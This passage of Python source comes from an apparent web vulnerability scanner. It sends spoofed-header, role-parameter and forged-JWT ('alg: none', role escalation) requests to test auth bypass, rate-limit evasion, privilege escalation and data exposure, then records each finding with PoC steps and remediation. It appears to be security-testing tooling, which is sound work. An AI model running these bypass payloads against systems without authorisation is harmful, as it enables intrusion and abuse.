                                cwe_id="CWE-639"
                            )
                            findings.append(finding)
                            
                    except Exception as e:
                        self.logger.debug(f"Encoding bypass error: {str(e)}")
                        
        return findings
        
    def is_encoding_bypass_successful(self, response: Dict[str, Any]) -> bool:
        """Check if encoding bypass was successful"""
        return response["status"] == 200 and len(response["content"]) > 100
        
    async def scan_auth_bypass(self) -> List[VulnerabilityFinding]:
        """Scan for authentication bypass vulnerabilities"""
        self.logger.info("🔍 Scanning for authentication bypass vulnerabilities...")
        findings = []
        
        bypass_techniques = [
            self.auth_bypass_parameter_manipulation,
            self.auth_bypass_header_manipulation,
            self.auth_bypass_cookie_manipulation,
            self.auth_bypass_jwt_attacks,
            self.auth_bypass_sql_injection
        ]
        
        for technique in bypass_techniques:
            try:
                technique_findings = await technique()
                findings.extend(technique_findings)
            except Exception as e:
                self.logger.error(f"❌ Auth bypass technique failed: {str(e)}")
                
        return findings
        
    async def auth_bypass_parameter_manipulation(self) -> List[VulnerabilityFinding]:
        """Test authentication bypass via parameter manipulation"""
        findings = []
        
        auth_bypass_payloads = self.payloads["auth_bypass"]
        
        # Common authentication parameters
        auth_params = [
            "username", "user", "login", "email", "uid", "user_id",
            "password", "pass", "pwd", "auth", "authenticated",
            "admin", "role", "privilege", "level", "access"
        ]
        
        for target in self.scan_targets:
            # Test different parameter combinations
            for param in auth_params:
                for payload in auth_bypass_payloads:
                    modified_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        headers=target.headers.copy(),
                        parameters={**target.parameters, param: payload},
                        auth_token=target.auth_token,
                        session_cookies={},  # Remove session cookies to test bypass
                        rate_limit=target.rate_limit,
                        priority=target.priority
                    )
                    
                    try:
                        response = await self.make_authenticated_request(
                            modified_target, {}
                        )
                        
                        if self.is_auth_bypass_successful(response):
                            finding = VulnerabilityFinding(
                                vuln_type=VulnerabilityType.AUTH_BYPASS,
                                severity=SeverityLevel.HIGH,
                                title="Authentication Bypass via Parameter Manipulation",
                                description=f"Authentication bypassed using parameter {param}={payload}",
                                url=target.url,
                                method=target.method,
                                parameters={param: payload},
                                payload=f"{param}={payload}",
                                evidence={
                                    "bypass_parameter": param,
                                    "bypass_payload": payload,
                                    "response_status": response["status"],
                                    "response_sample": response["content"][:300]
                                },
                                poc_steps=[
                                    f"1. Access URL: {target.url}",
                                    f"2. Add parameter: {param}={payload}",
                                    "3. Observe authentication bypass",
                                    "4. Access protected content"
                                ],
                                business_impact="Unauthorized access to protected resources without proper authentication",
                                remediation="Implement robust server-side authentication checks",
                                confidence=0.85,
                                discovered_at=datetime.now(),
                                cvss_score=7.0,
                                cwe_id="CWE-287"
                            )
                            findings.append(finding)
                            
                    except Exception as e:
                        self.logger.debug(f"Auth bypass test error: {str(e)}")
                        
        return findings
        
    def is_auth_bypass_successful(self, response: Dict[str, Any]) -> bool:
        """Check if authentication bypass was successful"""
        if response["status"] != 200:
            return False
            
        content = response["content"].lower()
        
        # Indicators of successful authentication
        success_indicators = [
            "welcome", "dashboard", "profile", "logout", "authenticated",
            "account", "settings", "admin", "user data", "private"
        ]
        
        # Indicators of failed authentication
        failure_indicators = [
            "login", "sign in", "unauthorized", "access denied",
            "forbidden", "authentication required", "please log in"
        ]
        
        # Check for success indicators
        for indicator in success_indicators:
            if indicator in content:
                # Make sure it's not a failure page
                has_failure = any(fail in content for fail in failure_indicators)
                if not has_failure:
                    return True
                    
        return False
        
    async def auth_bypass_header_manipulation(self) -> List[VulnerabilityFinding]:
        """Test authentication bypass via header manipulation"""
        findings = []
        
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-User-ID": "admin"},
            {"X-Username": "admin"},
            {"X-Role": "admin"},
            {"X-Admin": "true"},
            {"X-Authenticated": "true"},
            {"X-Auth-User": "admin"},
            {"X-Forwarded-User": "admin"},
            {"Authorization": "Bearer admin"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
        ]
        
        for target in self.scan_targets:
            for bypass_header in bypass_headers:
                modified_target = ScanTarget(
                    url=target.url,
                    method=target.method,
                    headers={**target.headers, **bypass_header},
                    parameters=target.parameters.copy(),
                    auth_token=None,  # Remove auth token
                    session_cookies={},  # Remove session cookies
                    rate_limit=target.rate_limit,
                    priority=target.priority
                )
                
                try:
                    response = await self.make_authenticated_request(
                        modified_target, {}
                    )
                    
                    if self.is_auth_bypass_successful(response):
                        header_name = list(bypass_header.keys())[0]
                        header_value = list(bypass_header.values())[0]
                        
                        finding = VulnerabilityFinding(
                            vuln_type=VulnerabilityType.AUTH_BYPASS,
                            severity=SeverityLevel.HIGH,
                            title="Authentication Bypass via Header Manipulation",
                            description=f"Authentication bypassed using header {header_name}: {header_value}",
                            url=target.url,
                            method=target.method,
                            parameters=target.parameters,
                            payload=f"{header_name}: {header_value}",
                            evidence={
                                "bypass_header": bypass_header,
                                "response_status": response["status"],
                                "response_sample": response["content"][:300]
                            },
                            poc_steps=[
                                f"1. Access URL: {target.url}",
                                f"2. Add header: {header_name}: {header_value}",
                                "3. Observe authentication bypass",
                                "4. Access protected content"
                            ],
                            business_impact="Attackers can bypass authentication using crafted headers",
                            remediation="Do not rely on client-controlled headers for authentication",
                            confidence=0.9,
                            discovered_at=datetime.now(),
                            cvss_score=7.5,
                            cwe_id="CWE-287"
                        )
                        findings.append(finding)
                        
                except Exception as e:
                    self.logger.debug(f"Header bypass test error: {str(e)}")
                    
        return findings
        
    async def make_authenticated_request(self, target: ScanTarget, cookies: Dict[str, str]) -> Dict[str, Any]:
        """Make authenticated HTTP request"""
        try:
            # Prepare request parameters
            headers = target.headers.copy()
            
            # Add authentication token if present
            if target.auth_token:
                headers["Authorization"] = f"Bearer {target.auth_token}"
                
            # Use proxy if available
            if self.proxy_manager:
                if target.method.upper() == "GET":
                    url_with_params = target.url
                    if target.parameters:
                        url_with_params += "?" + urllib.parse.urlencode(target.parameters)
                    
                    status, content, response_headers = await self.proxy_manager.make_request(
                        url_with_params, method=target.method, headers=headers, cookies=cookies
                    )
                else:
                    status, content, response_headers = await self.proxy_manager.make_request(
                        target.url, method=target.method, headers=headers, 
                        data=target.parameters, cookies=cookies
                    )
                    
                self.stats["requests_made"] += 1
                
                return {
                    "status": status,
                    "content": content,
                    "headers": dict(response_headers)
                }
            else:
                # Direct request without proxy
                async with aiohttp.ClientSession(cookies=aiohttp.CookieJar()) as session:
                    # Add cookies
                    for name, value in cookies.items():
                        session.cookie_jar.update_cookies({name: value})
                        
                    if target.method.upper() == "GET":
                        async with session.get(
                            target.url, 
                            headers=headers, 
                            params=target.parameters,
                            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
                        ) as response:
                            content = await response.text()
                            self.stats["requests_made"] += 1
                            
                            return {
                                "status": response.status,
                                "content": content,
                                "headers": dict(response.headers)
                            }
                    else:
                        async with session.request(
                            target.method,
                            target.url,
                            headers=headers,
                            data=target.parameters,
                            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
                        ) as response:
                            content = await response.text()
                            self.stats["requests_made"] += 1
                            
                            return {
                                "status": response.status,
                                "content": content,
                                "headers": dict(response.headers)
                            }
                            
        except Exception as e:
            self.logger.error(f"❌ Request failed: {str(e)}")
            return {
                "status": 0,
                "content": "",
                "headers": {}
            }
            
    async def scan_business_logic_flaws(self) -> List[VulnerabilityFinding]:
        """Scan for business logic vulnerabilities"""
        self.logger.info("🔍 Scanning for business logic flaws...")
        findings = []
        
        business_logic_tests = [
            self.test_negative_values,
            self.test_large_values,
            self.test_null_values,
            self.test_bypass_workflow,
            self.test_race_conditions
        ]
        
        for test in business_logic_tests:
            try:
                test_findings = await test()
                findings.extend(test_findings)
            except Exception as e:
                self.logger.error(f"❌ Business logic test failed: {str(e)}")
                
        return findings
        
    async def test_negative_values(self) -> List[VulnerabilityFinding]:
        """Test for negative value vulnerabilities"""
        findings = []
        
        negative_payloads = ["-1", "-999", "-2147483648", "-0.01", "-9999.99"]
        
        for target in self.scan_targets:
            if not target.parameters:
                continue
                
            for param_name, param_value in target.parameters.items():
                # Only test numeric-looking parameters
                if not self.is_numeric_parameter(param_name, param_value):
                    continue
                    
                for payload in negative_payloads:
                    modified_params = target.parameters.copy()
                    modified_params[param_name] = payload
                    
                    modified_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        headers=target.headers.copy(),
                        parameters=modified_params,
                        auth_token=target.auth_token,
                        session_cookies=target.session_cookies.copy(),
                        rate_limit=target.rate_limit,
                        priority=target.priority
                    )
                    
                    try:
                        response = await self.make_authenticated_request(
                            modified_target, target.session_cookies
                        )
                        
                        if self.is_negative_value_vulnerable(response, payload):
                            finding = VulnerabilityFinding(
                                vuln_type=VulnerabilityType.BUSINESS_LOGIC,
                                severity=SeverityLevel.MEDIUM,
                                title="Business Logic Flaw - Negative Value Accepted",
                                description=f"Application accepts negative value {payload} for parameter {param_name}",
                                url=target.url,
                                method=target.method,
                                parameters=modified_params,
                                payload=f"{param_name}={payload}",
                                evidence={
                                    "parameter": param_name,
                                    "negative_value": payload,
                                    "response_status": response["status"],
                                    "response_indicators": self.extract_business_logic_indicators(response["content"])
                                },
                                poc_steps=[
                                    f"1. Access URL: {target.url}",
                                    f"2. Set parameter {param_name} to negative value: {payload}",
                                    "3. Observe application accepts negative value",
                                    "4. Exploit business logic flaw"
                                ],
                                business_impact="Negative values could lead to unintended behavior, financial loss, or data corruption",
                                remediation="Implement proper input validation to reject invalid negative values",
                                confidence=0.7,
                                discovered_at=datetime.now(),
                                cvss_score=4.5,
                                cwe_id="CWE-20"
                            )
                            findings.append(finding)
                            
                    except Exception as e:
                        self.logger.debug(f"Negative value test error: {str(e)}")
                        
        return findings
        
    def is_numeric_parameter(self, param_name: str, param_value: str) -> bool:
        """Check if parameter appears to be numeric"""
        numeric_patterns = [
            "amount", "price", "cost", "total", "sum", "quantity", "qty",
            "count", "number", "num", "id", "age", "year", "month", "day",
            "balance", "credit", "debit", "discount", "tax", "fee"
        ]
        
        param_lower = param_name.lower()
        
        for pattern in numeric_patterns:
            if pattern in param_lower:
                return True
                
        # Check if current value is numeric
        try:
            float(param_value)
            return True
        except ValueError:
            return False
            
    def is_negative_value_vulnerable(self, response: Dict[str, Any], payload: str) -> bool:
        """Check if negative value created a vulnerability"""
        if response["status"] != 200:
            return False
            
        content = response["content"].lower()
        
        # Indicators that negative value was processed
        vulnerable_indicators = [
            "success", "updated", "processed", "accepted", "confirmed",
            "transaction", "balance", "total", "amount", payload
        ]
        
        for indicator in vulnerable_indicators:
            if indicator in content:
                return True
                
        return False
        
    def extract_business_logic_indicators(self, content: str) -> List[str]:
        """Extract indicators of business logic issues"""
        indicators = []
        content_lower = content.lower()
        
        business_keywords = [
            "success", "error", "invalid", "accepted", "rejected",
            "processed", "failed", "balance", "amount", "total",
            "transaction", "order", "payment", "refund"
        ]
        
        for keyword in business_keywords:
            if keyword in content_lower:
                indicators.append(keyword)
                
        return indicators
        
    async def post_process_findings(self):
        """Post-process findings to remove false positives and enhance data"""
        self.logger.info("🔧 Post-processing vulnerability findings...")
        
        # Remove duplicates
        unique_findings = []
        seen_signatures = set()
        
        for finding in self.findings:
            signature = f"{finding.vuln_type.value}_{finding.url}_{finding.payload}"
            signature_hash = hashlib.md5(signature.encode()).hexdigest()
            
            if signature_hash not in seen_signatures:
                seen_signatures.add(signature_hash)
                unique_findings.append(finding)
            else:
                self.stats["false_positives_filtered"] += 1
                
        self.findings = unique_findings
        
        # Sort by severity and confidence
        severity_order = {
            SeverityLevel.CRITICAL: 5,
            SeverityLevel.HIGH: 4,
            SeverityLevel.MEDIUM: 3,
            SeverityLevel.LOW: 2,
            SeverityLevel.INFO: 1
        }
        
        self.findings.sort(
            key=lambda f: (severity_order.get(f.severity, 0), f.confidence),
            reverse=True
        )
        
        # Enhance findings with additional context
        for finding in self.findings:
            finding.business_impact = self.enhance_business_impact(finding)
            finding.remediation = self.enhance_remediation(finding)
            
        self.logger.info(f"✅ Post-processing complete: {len(self.findings)} unique findings")
        
    def enhance_business_impact(self, finding: VulnerabilityFinding) -> str:
        """Enhance business impact description"""
        base_impact = finding.business_impact
        
        # Add severity-specific context
        if finding.severity == SeverityLevel.CRITICAL:
            base_impact += " This critical vulnerability poses immediate risk to business operations and should be addressed urgently."
        elif finding.severity == SeverityLevel.HIGH:
            base_impact += " This high-severity issue could significantly impact business operations."
        elif finding.severity == SeverityLevel.MEDIUM:
            base_impact += " This vulnerability presents moderate risk to business operations."
            
        # Add vulnerability-specific context
        if finding.vuln_type == VulnerabilityType.IDOR:
            base_impact += " IDOR vulnerabilities can lead to data breaches, privacy violations, and regulatory compliance issues."
        elif finding.vuln_type == VulnerabilityType.AUTH_BYPASS:
            base_impact += " Authentication bypass can result in complete system compromise and unauthorized access to sensitive data."
            
        return base_impact
        
    def enhance_remediation(self, finding: VulnerabilityFinding) -> str:
        """Enhance remediation recommendations"""
        base_remediation = finding.remediation
        
        # Add specific technical recommendations
        if finding.vuln_type == VulnerabilityType.IDOR:
            base_remediation += "\n\nSpecific recommendations:\n"
            base_remediation += "- Implement object-level authorization checks\n"
            base_remediation += "- Use indirect object references (mapping tables)\n"
            base_remediation += "- Validate user permissions for each resource access\n"
            base_remediation += "- Consider using UUIDs instead of sequential IDs"
            
        elif finding.vuln_type == VulnerabilityType.AUTH_BYPASS:
            base_remediation += "\n\nSpecific recommendations:\n"
            base_remediation += "- Implement server-side session validation\n"
            base_remediation += "- Use secure authentication frameworks\n"
            base_remediation += "- Validate all authentication tokens server-side\n"
            base_remediation += "- Implement proper session management"
            
        return base_remediation
        
    async def scan_rate_limit_bypass(self) -> List[VulnerabilityFinding]:
        """Scan for rate limiting bypass vulnerabilities"""
        self.logger.info("🔍 Scanning for rate limit bypass vulnerabilities...")
        findings = []
        
        bypass_techniques = [
            self.rate_limit_header_bypass,
            self.rate_limit_ip_bypass,
            self.rate_limit_user_agent_bypass,
            self.rate_limit_distributed_bypass
        ]
        
        for technique in bypass_techniques:
            try:
                technique_findings = await technique()
                findings.extend(technique_findings)
            except Exception as e:
                self.logger.error(f"❌ Rate limit bypass technique failed: {str(e)}")
                
        return findings
        
    async def rate_limit_header_bypass(self) -> List[VulnerabilityFinding]:
        """Test rate limit bypass using headers"""
        findings = []
        
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "192.168.1.1"},
            {"X-Originating-IP": "10.0.0.1"},
            {"X-Remote-IP": "172.16.0.1"},
            {"X-Client-IP": "203.0.113.1"},
            {"True-Client-IP": "198.51.100.1"},
            {"X-Cluster-Client-IP": "203.0.113.2"},
            {"CF-Connecting-IP": "198.51.100.2"},
        ]
        
        # Test endpoints that are likely to have rate limiting
        rate_limited_endpoints = [
            "/api/login", "/login", "/auth", "/register", "/reset-password",
            "/api/search", "/search", "/api/data", "/submit", "/contact"
        ]
        
        for endpoint in rate_limited_endpoints:
            test_url = f"https://{self.config.target_domain}{endpoint}"
            
            # First, trigger rate limiting
            rate_limit_triggered = await self.trigger_rate_limit(test_url)
            
            if not rate_limit_triggered:
                continue
                
            # Now test bypass techniques
            for bypass_header in bypass_headers:
                try:
                    # Test if header bypass works
                    bypass_successful = await self.test_header_rate_limit_bypass(
                        test_url, bypass_header
                    )
                    
                    if bypass_successful:
                        header_name = list(bypass_header.keys())[0]
                        header_value = list(bypass_header.values())[0]
                        
                        finding = VulnerabilityFinding(
                            vuln_type=VulnerabilityType.RATE_LIMIT_BYPASS,
                            severity=SeverityLevel.MEDIUM,
                            title="Rate Limit Bypass via Header Manipulation",
                            description=f"Rate limiting bypassed using {header_name} header",
                            url=test_url,
                            method="POST",
                            parameters={},
                            payload=f"{header_name}: {header_value}",
                            evidence={
                                "bypass_header": bypass_header,
                                "endpoint": endpoint,
                                "bypass_confirmed": True
                            },
                            poc_steps=[
                                f"1. Trigger rate limit on {endpoint}",
                                f"2. Add header: {header_name}: {header_value}",
                                "3. Continue making requests",
                                "4. Observe rate limit bypass"
                            ],
                            business_impact="Rate limit bypass can enable brute force attacks, DDoS, and resource exhaustion",
                            remediation="Implement rate limiting based on multiple factors, not just client IP",
                            confidence=0.8,
                            discovered_at=datetime.now(),
                            cvss_score=5.0,
                            cwe_id="CWE-770"
                        )
                        findings.append(finding)
                        
                except Exception as e:
                    self.logger.debug(f"Rate limit header bypass test error: {str(e)}")
                    
        return findings
        
    async def trigger_rate_limit(self, url: str) -> bool:
        """Attempt to trigger rate limiting on an endpoint"""
        try:
            consecutive_requests = 0
            
            for i in range(20):  # Try 20 requests
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        url,
                        data={"test": "data"},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status == 429:  # Too Many Requests
                            return True
                        elif response.status in [200, 400, 401, 403]:
                            consecutive_requests += 1
                        else:
                            break
                            
                await asyncio.sleep(0.1)  # Small delay
                
            return False
            
        except Exception as e:
            self.logger.debug(f"Rate limit trigger error: {str(e)}")
            return False
            
    async def test_header_rate_limit_bypass(self, url: str, bypass_header: Dict[str, str]) -> bool:
        """Test if header can bypass rate limiting"""
        try:
            # Make multiple requests with bypass header
            success_count = 0
            
            for i in range(10):
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        url,
                        data={"test": "data"},
                        headers=bypass_header,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as response:
                        if response.status != 429:  # Not rate limited
                            success_count += 1
                            
                await asyncio.sleep(0.1)
                
            # If most requests succeeded, bypass worked
            return success_count > 7
            
        except Exception as e:
            self.logger.debug(f"Header bypass test error: {str(e)}")
            return False
            
    async def scan_privilege_escalation(self) -> List[VulnerabilityFinding]:
        """Scan for privilege escalation vulnerabilities"""
        self.logger.info("🔍 Scanning for privilege escalation vulnerabilities...")
        findings = []
        
        escalation_techniques = [
            self.test_role_parameter_manipulation,
            self.test_admin_function_access,
            self.test_jwt_role_manipulation
        ]
        
        for technique in escalation_techniques:
            try:
                technique_findings = await technique()
                findings.extend(technique_findings)
            except Exception as e:
                self.logger.error(f"❌ Privilege escalation technique failed: {str(e)}")
                
        return findings
        
    async def test_role_parameter_manipulation(self) -> List[VulnerabilityFinding]:
        """Test privilege escalation via role parameter manipulation"""
        findings = []
        
        role_parameters = ["role", "user_role", "privilege", "level", "access_level", "permission"]
        admin_values = ["admin", "administrator", "root", "superuser", "1", "true", "elevated"]
        
        for target in self.scan_targets:
            for role_param in role_parameters:
                for admin_value in admin_values:
                    modified_params = target.parameters.copy()
                    modified_params[role_param] = admin_value
                    
                    modified_target = ScanTarget(
                        url=target.url,
                        method=target.method,
                        headers=target.headers.copy(),
                        parameters=modified_params,
                        auth_token=target.auth_token,
                        session_cookies=target.session_cookies.copy(),
                        rate_limit=target.rate_limit,
                        priority=target.priority
                    )
                    
                    try:
                        response = await self.make_authenticated_request(
                            modified_target, target.session_cookies
                        )
                        
                        if self.is_privilege_escalation_successful(response):
                            finding = VulnerabilityFinding(
                                vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                                severity=SeverityLevel.HIGH,
                                title="Privilege Escalation via Role Parameter Manipulation",
                                description=f"Privilege escalation achieved by setting {role_param}={admin_value}",
                                url=target.url,
                                method=target.method,
                                parameters=modified_params,
                                payload=f"{role_param}={admin_value}",
                                evidence={
                                    "role_parameter": role_param,
                                    "admin_value": admin_value,
                                    "response_status": response["status"],
                                    "admin_indicators": self.extract_admin_indicators(response["content"])
                                },
                                poc_steps=[
                                    f"1. Access {target.url}",
                                    f"2. Add parameter: {role_param}={admin_value}",
                                    "3. Observe elevated privileges",
                                    "4. Access admin functionality"
                                ],
                                business_impact="Users can escalate privileges to admin level, compromising system security",
                                remediation="Implement server-side role validation and never trust client-provided role information",
                                confidence=0.85,
                                discovered_at=datetime.now(),
                                cvss_score=8.0,
                                cwe_id="CWE-269"
                            )
                            findings.append(finding)
                            
                    except Exception as e:
                        self.logger.debug(f"Role manipulation test error: {str(e)}")
                        
        return findings
        
    def is_privilege_escalation_successful(self, response: Dict[str, Any]) -> bool:
        """Check if privilege escalation was successful"""
        if response["status"] != 200:
            return False
            
        content = response["content"].lower()
        
        # Admin privilege indicators
        admin_indicators = [
            "admin panel", "admin dashboard", "user management",
            "system settings", "delete user", "manage users",
            "admin privileges", "administrator", "system admin"
        ]
        
        for indicator in admin_indicators:
            if indicator in content:
                return True
                
        return False
        
    async def scan_info_disclosure(self) -> List[VulnerabilityFinding]:
        """Scan for information disclosure vulnerabilities"""
        self.logger.info("🔍 Scanning for information disclosure vulnerabilities...")
        findings = []
        
        disclosure_techniques = [
            self.test_debug_information,
            self.test_error_messages,
            self.test_backup_files,
            self.test_source_code_disclosure
        ]
        
        for technique in disclosure_techniques:
            try:
                technique_findings = await technique()
                findings.extend(technique_findings)
            except Exception as e:
                self.logger.error(f"❌ Info disclosure technique failed: {str(e)}")
                
        return findings
        
    async def test_debug_information(self) -> List[VulnerabilityFinding]:
        """Test for debug information disclosure"""
        findings = []
        
        debug_parameters = [
            {"debug": "true"}, {"debug": "1"}, {"test": "1"},
            {"dev": "1"}, {"development": "true"}, {"verbose": "true"},
            {"trace": "1"}, {"stack": "true"}
        ]
        
        for target in self.scan_targets:
            for debug_param in debug_parameters:
                modified_params = {**target.parameters, **debug_param}
                
                modified_target = ScanTarget(
                    url=target.url,
                    method=target.method,
                    headers=target.headers.copy(),
                    parameters=modified_params,
                    auth_token=target.auth_token,
                    session_cookies=target.session_cookies.copy(),
                    rate_limit=target.rate_limit,
                    priority=target.priority
                )
                
                try:
                    response = await self.make_authenticated_request(
                        modified_target, target.session_cookies
                    )
                    
                    disclosed_info = self.extract_debug_information(response["content"])
                    
                    if disclosed_info:
                        param_name = list(debug_param.keys())[0]
                        param_value = list(debug_param.values())[0]
                        
                        finding = VulnerabilityFinding(
                            vuln_type=VulnerabilityType.INFO_DISCLOSURE,
                            severity=SeverityLevel.MEDIUM,
                            title="Debug Information Disclosure",
                            description=f"Debug information disclosed via {param_name}={param_value}",
                            url=target.url,
                            method=target.method,
                            parameters=modified_params,
                            payload=f"{param_name}={param_value}",
                            evidence={
                                "debug_parameter": debug_param,
                                "disclosed_information": disclosed_info,
                                "response_status": response["status"]
                            },
                            poc_steps=[
                                f"1. Access {target.url}",
                                f"2. Add parameter: {param_name}={param_value}",
                                "3. Observe debug information in response",
                                "4. Extract sensitive information"
                            ],
                            business_impact="Debug information can reveal system internals, file paths, and sensitive configuration",
                            remediation="Disable debug mode in production and implement proper error handling",
                            confidence=0.75,
                            discovered_at=datetime.now(),
                            cvss_score=4.0,
                            cwe_id="CWE-200"
                        )
                        findings.append(finding)
                        
                except Exception as e:
                    self.logger.debug(f"Debug info test error: {str(e)}")
                    
        return findings
        
    def extract_debug_information(self, content: str) -> List[str]:
        """Extract debug information from response"""
        debug_indicators = []
        
        debug_patterns = [
            r'stack trace', r'exception', r'error in file',
            r'line \d+', r'\.php:\d+', r'\.py:\d+', r'\.java:\d+',
            r'database error', r'sql error', r'mysql error',
            r'debug: ', r'trace: ', r'warning: ',
            r'/var/www/', r'/home/', r'c:\\', r'd:\\',
            r'secret_key', r'api_key', r'password',
            r'config\.', r'settings\.', r'env\.'
        ]
        
        content_lower = content.lower()
        
        for pattern in debug_patterns:
            if re.search(pattern, content_lower):
                debug_indicators.append(pattern)
                
        return debug_indicators
        
    async def scan_api_abuse(self) -> List[VulnerabilityFinding]:
        """Scan for API abuse vulnerabilities"""
        self.logger.info("🔍 Scanning for API abuse vulnerabilities...")
        findings = []
        
        api_abuse_techniques = [
            self.test_excessive_data_exposure,
            self.test_mass_assignment,
            self.test_api_versioning_bypass
        ]
        
        for technique in api_abuse_techniques:
            try:
                technique_findings = await technique()
                findings.extend(technique_findings)
            except Exception as e:
                self.logger.error(f"❌ API abuse technique failed: {str(e)}")
                
        return findings
        
    async def test_excessive_data_exposure(self) -> List[VulnerabilityFinding]:
        """Test for excessive data exposure in API responses"""
        findings = []
        
        # API endpoints likely to have data exposure issues
        api_endpoints = [
            "/api/user/profile", "/api/users", "/api/user/{id}",
            "/api/account", "/api/profile", "/api/me",
            "/api/v1/users", "/api/v2/profile"
        ]
        
        for endpoint in api_endpoints:
            test_url = f"https://{self.config.target_domain}{endpoint}"
            
            target = ScanTarget(
                url=test_url,
                method="GET",
                headers={"Accept": "application/json"},
                parameters={},
                auth_token=None,
                session_cookies={},
                rate_limit=30,
                priority=3
            )
            
            try:
                response = await self.make_authenticated_request(target, {})
                
                if response["status"] == 200:
                    exposed_data = self.analyze_data_exposure(response["content"])
                    
                    if exposed_data:
                        finding = VulnerabilityFinding(
                            vuln_type=VulnerabilityType.API_ABUSE,
                            severity=SeverityLevel.MEDIUM,
                            title="Excessive Data Exposure in API Response",
                            description=f"API endpoint exposes sensitive data fields",
                            url=test_url,
                            method="GET",
                            parameters={},
                            payload="GET request",
                            evidence={
                                "exposed_fields": exposed_data,
                                "response_sample": response["content"][:500]
                            },
                            poc_steps=[
                                f"1. Access API endpoint: {test_url}",
                                "2. Observe response contains sensitive data",
                                "3. Extract exposed information"
                            ],
                            business_impact="Excessive data exposure can lead to privacy violations and data breaches",
                            remediation="Implement response filtering to only return necessary data fields",
                            confidence=0.7,
                            discovered_at=datetime.now(),
                            cvss_score=5.0,
                            cwe_id="CWE-200"
                        )
                        findings.append(finding)
                        
            except Exception as e:
                self.logger.debug(f"Data exposure test error: {str(e)}")
                
        return findings
        
    def analyze_data_exposure(self, content: str) -> List[str]:
        """Analyze API response for excessive data exposure"""
        exposed_fields = []
        
        try:
            if content.strip().startswith('{'):
                data = json.loads(content)
                sensitive_fields = self.find_sensitive_fields(data)
                exposed_fields.extend(sensitive_fields)
        except json.JSONDecodeError:
            pass
            
        # Check for sensitive patterns in text
        sensitive_patterns = [
            r'password', r'secret', r'token', r'key',
            r'ssn', r'social.*security', r'credit.*card',
            r'phone.*number', r'address', r'birth.*date'
        ]
        
        content_lower = content.lower()
        
        for pattern in sensitive_patterns:
            if re.search(pattern, content_lower):
                exposed_fields.append(pattern)
                
        return list(set(exposed_fields))
        
    def find_sensitive_fields(self, data: Any, path="") -> List[str]:
        """Recursively find sensitive fields in JSON data"""
        sensitive_fields = []
        
        sensitive_keywords = [
            'password', 'secret', 'token', 'key', 'ssn', 'social_security',
            'credit_card', 'phone', 'address', 'birth_date', 'api_key',
            'private_key', 'hash', 'salt'
        ]
        
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                
                # Check if key is sensitive
                key_lower = key.lower()
                for keyword in sensitive_keywords:
                    if keyword in key_lower:
                        sensitive_fields.append(current_path)
                        break
                        
                # Recursively check nested objects
                if isinstance(value, (dict, list)):
                    sensitive_fields.extend(self.find_sensitive_fields(value, current_path))
                    
        elif isinstance(data, list):
            for i, item in enumerate(data):
                if isinstance(item, (dict, list)):
                    sensitive_fields.extend(self.find_sensitive_fields(item, f"{path}[{i}]"))
                    
        return sensitive_fields
        
    def generate_jwt_attack_payloads(self, token: str) -> List[Dict[str, Any]]:
        """Generate JWT attack payloads"""
        payloads = []
        
        try:
            # Decode JWT (without verification)
            header, payload_part, signature = token.split('.')
            
            # Decode header and payload
            import base64
            header_data = json.loads(base64.urlsafe_b64decode(header + '=='))
            payload_data = json.loads(base64.urlsafe_b64decode(payload_part + '=='))
            
            # Generate attack payloads
            
            # 1. Algorithm confusion
            none_header = header_data.copy()
            none_header['alg'] = 'none'
            payloads.append({
                'type': 'algorithm_confusion',
                'header': none_header,
                'payload': payload_data,
                'signature': ''
            })
            
            # 2. Role escalation
            admin_payload = payload_data.copy()
            if 'role' in admin_payload:
                admin_payload['role'] = 'admin'
            if 'user_role' in admin_payload:
                admin_payload['user_role'] = 'admin'
            if 'is_admin' in admin_payload:
                admin_payload['is_admin'] = True
                
            payloads.append({
                'type': 'role_escalation',
                'header': header_data,
                'payload': admin_payload,
                'signature': signature
            })
            
            # 3. User ID manipulation
            if 'user_id' in payload_data:
                user_manipulation = payload_data.copy()
                user_manipulation['user_id'] = 1  # Try admin user ID
                payloads.append({
                    'type': 'user_id_manipulation',
                    'header': header_data,
                    'payload': user_manipulation,
                    'signature': signature
                })
                
        except Exception as e:
            self.logger.debug(f"JWT payload generation error: {str(e)}")
            
        return payloads
        
    def get_scan_statistics(self) -> Dict[str, Any]:
        """Get comprehensive scan statistics"""
        duration = 0
        if self.stats["scan_start_time"] and self.stats["scan_end_time"]:
            duration = (self.stats["scan_end_time"] - self.stats["scan_start_time"]).total_seconds()
            
        # Count findings by severity
        severity_counts = {}
        for severity in SeverityLevel:
            severity_counts[severity.value] = len([
                f for f in self.findings if f.severity == severity
            ])
            
        # Count findings by vulnerability type
        vuln_type_counts = {}
        for vuln_type in VulnerabilityType:
            vuln_type_counts[vuln_type.value] = len([
                f for f in self.findings if f.vuln_type == vuln_type
            ])
            
        return {
            "scan_duration_seconds": duration,
            "total_requests": self.stats["requests_made"],
            "total_findings": len(self.findings),
            "targets_scanned": len(self.scan_targets),
            "false_positives_filtered": self.stats["false_positives_filtered"],
            "findings_by_severity": severity_counts,
            "findings_by_type": vuln_type_counts,
            "average_confidence": sum(f.confidence for f in self.findings) / len(self.findings) if self.findings else 0,
            "critical_findings": len([f for f in self.findings if f.severity == SeverityLevel.CRITICAL]),
            "high_findings": len([f for f in self.findings if f.severity == SeverityLevel.HIGH])
        }
        
    def export_findings(self, format_type: str = "json") -> str:
        """Export findings in various formats"""
        if format_type == "json":
            return self.export_json()
        elif format_type == "xml":
            return self.export_xml()
        elif format_type == "csv":
            return self.export_csv()
        elif format_type == "markdown":
